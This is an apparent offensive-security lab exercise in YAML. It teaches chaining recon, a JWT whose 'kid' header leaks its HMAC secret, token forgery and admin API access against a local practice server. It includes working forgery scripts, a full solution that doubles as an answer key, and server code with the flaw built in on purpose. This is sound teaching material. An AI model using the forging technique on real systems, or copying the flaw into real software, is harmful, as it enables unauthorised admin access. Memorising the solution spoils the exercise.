- id: offsec-web-040
  title: "Incident: chain your way into the admin API"
  difficulty: 4
  kind: build
  tags: [web, recon, idor, jwt, chaining, incident]
  tutorial: |
    **What you're learning.** Chaining flaws into an admin compromise: recon → key leak → forged token → privileged action.

    ### Method

    Each step feeds the next:

    | step | technique (exercise) |
    |---|---|
    | 1. recon | a base64-encoded debug path in `GET /` (offsec-web-001) |
    | 2. token | a JWT whose **`kid` header leaks the signing secret** (a path/secret injection): read `kid`, use it as the HMAC key |
    | 3. forge | re-sign `{"role":"admin"}` with that key (offsec-web-027) |
    | 4. act | call the admin API with the forged token and read the flag |

    ```python
    import base64, json, hmac, hashlib, urllib.request
    b64e = lambda b: base64.urlsafe_b64encode(b).rstrip(b"=").decode()
    b64d = lambda s: base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))
    root = json.loads(urllib.request.urlopen("http://127.0.0.1:8099/").read())
    path = base64.b64decode(root["debug"]).decode()
    tok = json.loads(urllib.request.urlopen("http://127.0.0.1:8099" + path).read())["token"]
    h = json.loads(b64d(tok.split(".")[0]))
    secret = h["kid"]            # leaked key material
    head = b64e(json.dumps({"alg":"HS256","typ":"JWT","kid":secret}).encode())
    pay = b64e(json.dumps({"role":"admin"}).encode())
    sig = b64e(hmac.new(secret.encode(), f"{head}.{pay}".encode(), hashlib.sha256).digest())
    forged = f"{head}.{pay}.{sig}"
    ```

    ### Check your work

    The forged token, built from the leaked `kid` secret, authorises the admin API call that returns the flag.
  scenario: |
    The API at **`http://127.0.0.1:8099/`** guards its flag behind three steps:

    1. **Recon.** `GET /` returns JSON hinting at a `debug` endpoint whose path
       is base64-encoded in the response.
    2. **Token.** That debug endpoint issues a signed JWT, but its signing
       secret is leaked in the token's own `kid` header field (a classic
       mistake). Use it to forge a token with `"role":"admin"`.
    3. **Access.** `GET /api/flag` with your admin token (header
       `Authorization: Bearer <jwt>`) returns the flag.

    Work the chain and write the `KL{...}` token to **`/lab/flag.txt`**.
  hints:
    - "`curl -s http://127.0.0.1:8099/` — base64-decode the `debug` field to get the path."
    - "Call that path, read the JWT it returns, and base64url-decode its header: the `kid` is the HMAC secret."
    - "Forge `{\"role\":\"admin\"}` signed HS256 with that secret, then `curl -s -H \"Authorization: Bearer $JWT\" http://127.0.0.1:8099/api/flag`."
  solution: |
    ```bash
    python3 - <<'PY' > /lab/flag.txt
    import base64, json, hmac, hashlib, urllib.request, re
    def b64e(b): return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
    def b64d(s): return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))
    root = json.loads(urllib.request.urlopen("http://127.0.0.1:8099/").read())
    path = base64.b64decode(root["debug"]).decode()
    tok = json.loads(urllib.request.urlopen("http://127.0.0.1:8099" + path).read())["token"]
    h, p, s = tok.split(".")
    secret = json.loads(b64d(h))["kid"]
    hp = b64e(b'{"alg":"HS256","typ":"JWT"}') + "." + b64e(json.dumps({"role": "admin"}).encode())
    sig = b64e(hmac.new(secret.encode(), hp.encode(), hashlib.sha256).digest())
    req = urllib.request.Request("http://127.0.0.1:8099/api/flag", headers={"Authorization": "Bearer " + hp + "." + sig})
    print(re.search(r"KL\{[0-9a-f]+\}", urllib.request.urlopen(req).read().decode()).group())
    PY
    ```
  setup: |
    FLAG=$(rand_flag); export FLAG
    echo "$FLAG" > "$KL_STATE/answer"
    web_target apichain 8099 <<'PY'
    import os, json, base64, hmac, hashlib, http.server, socketserver
    PORT = int(os.environ.get("PORT", "8099"))
    FLAG = os.environ.get("FLAG", "KL{missing}")
    SECRET = os.urandom(10).hex()
    DEBUG = "/debug/token-" + os.urandom(3).hex()
    def b64e(b): return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
    def b64d(s): return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))
    def mint(payload):
        h = b64e(('{"alg":"HS256","typ":"JWT","kid":"%s"}' % SECRET).encode())
        p = b64e(json.dumps(payload).encode())
        return h + "." + p + "." + b64e(hmac.new(SECRET.encode(), (h + "." + p).encode(), hashlib.sha256).digest())
    def verify(tok):
        try:
            h, p, s = tok.split(".")
        except Exception:
            return None
        if hmac.compare_digest(b64e(hmac.new(SECRET.encode(), (h + "." + p).encode(), hashlib.sha256).digest()), s):
            try:
                return json.loads(b64d(p))
            except Exception:
                return None
        return None
    class H(http.server.BaseHTTPRequestHandler):
        def log_message(self, *a): pass
        def _json(self, code, obj):
            b = json.dumps(obj).encode()
            self.send_response(code); self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(b))); self.end_headers(); self.wfile.write(b)
        def do_GET(self):
            if self.path == "/":
                self._json(200, {"service": "acme-api", "debug": base64.b64encode(DEBUG.encode()).decode()}); return
            if self.path == DEBUG:
                self._json(200, {"token": mint({"role": "guest"})}); return
            if self.path == "/api/flag":
                auth = self.headers.get("Authorization", "")
                payload = verify(auth[7:]) if auth.startswith("Bearer ") else None
                if payload and payload.get("role") == "admin":
                    self._json(200, {"flag": FLAG})
                else:
                    self._json(403, {"error": "admin only"})
                return
            self._json(404, {"error": "not found"})
    socketserver.TCPServer.allow_reuse_address = True
    socketserver.TCPServer(("0.0.0.0", PORT), H).serve_forever()
    PY
